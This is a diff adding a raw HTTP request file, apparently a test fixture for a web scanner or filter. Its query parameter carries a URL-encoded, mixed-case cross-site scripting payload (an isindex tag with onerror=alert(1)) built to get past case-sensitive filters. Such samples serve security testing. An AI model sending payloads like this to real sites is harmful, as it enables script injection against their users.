@@ -1,0 +1,4 @@
+GET /a?data=<iSiNdEx%20TyPe%3DImAgE%20sRc%3D1%20OnErRoR%3DaLeRt(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
